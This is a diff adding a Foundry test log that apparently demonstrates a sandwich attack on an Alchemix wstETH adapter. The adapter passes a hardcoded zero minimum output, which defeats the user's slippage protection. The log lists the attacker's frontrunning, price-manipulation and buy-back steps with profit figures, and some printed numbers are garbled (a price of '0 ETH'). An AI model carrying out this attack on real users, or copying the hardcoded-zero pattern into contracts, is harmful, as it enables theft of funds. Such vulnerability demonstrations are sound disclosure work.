@@ -1,0 +1,56 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/AttackSimulation.sol:AttackSimulation
+[PASS] testAttackSimulation() (gas: 63666)
+Logs:
+  === ALCHEMIX VULNERABILITY: ATTACK SIMULATION ===
+  
+=== SCENARIO PARAMETERS ===
+  Victim shares to withdraw: 10 shares
+  Initial wstETH price: 1 ETH
+  Victim slippage setting: 5 %
+  Attacker's target manipulated price: 0 ETH
+  Price manipulation: 33 %
+  
+=== STEP 1: SLIPPAGE CHECK PHASE ===
+  Expected output (based on initial price): 12 wstETH
+  Minimum acceptable output with
+  5 % slippage: 11 wstETH
+  AlchemistV2: expectedOutput >= minAmountOut? YES, proceed
+  
+=== STEP 2: PRICE MANIPULATION PHASE ===
+  Attacker frontrunning the transaction
+  Price manipulation technique:
+  1. Large sell of wstETH before victim transaction
+  2. Price temporarily drops by 33 %
+  3. wstETH price now: 0 ETH
+  
+=== STEP 3: EXECUTION PHASE ===
+  AlchemistV2 calls: adapter.unwrap(shares, 0) <-- Note hardcoded 0
+  WstETHAdapter calls: _exchange(amount, 0) <-- Note hardcoded 0 again
+  Actual output with manipulated price: 8 wstETH
+  Loss from expected output: 4 wstETH
+  Loss percentage: 33 %
+  
+=== STEP 4: VULNERABILITY ANALYSIS ===
+  Was victim's slippage setting respected? NO!
+  Minimum acceptable by victim: 11 wstETH
+  Actually received: 8 wstETH
+  SLIPPAGE PROTECTION FAILED: Received less than minimum acceptable!
+  Additional loss beyond allowed slippage:
+  28 %
+  
+=== STEP 5: ATTACKER PROFITS ===
+  Attacker buys back wstETH at lower price after victim's transaction
+  Profit from sandwich attack:
+  3 wstETH equivalent
+  (Accounting for ~10% trading costs/slippage)
+  
+=== CONCLUSION ===
+  Despite victim setting 5 % slippage protection,
+  They lost 33 % of expected value
+  Root cause: Adapter ignores slippage parameter and uses hardcoded 0
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 188.48ms (139.96ms CPU time)
+
+Ran 1 test suite in 233.50ms (188.48ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
